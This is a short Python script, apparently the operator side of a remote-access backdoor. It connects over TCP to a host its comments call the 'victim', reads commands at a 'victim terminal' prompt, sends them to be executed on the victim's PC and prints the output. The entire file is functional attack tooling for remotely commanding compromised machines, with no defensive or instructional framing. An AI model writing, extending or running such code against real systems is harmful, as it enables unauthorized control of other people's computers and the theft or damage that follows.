#imports required for this file
import socket
import sys

#Main function running realtime connection
def real(HOST, PORT):
	#Keeps connection open 
	while True:
		#Creates a socket which is used to connect to the victim
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		
		#Attempts to connect to the victim
		try:
			s.connect((HOST,PORT))
		#Returns an error if connection can not be made
		except:
			print("connection refused: wrong victim ip")
			break

		#Asks for a command to execute on victim pc
		command = input("victim terminal ~ $: ")
		
		#Special command option, exits realtime modus
		if command == "exit()":
			return False
			break
		#Sends command to victim pc
		else:
			s.sendall(command.encode())

			#Receives result of victim pc and prints it to console
			result = s.recv(1024)
			print("\n" + result.decode())
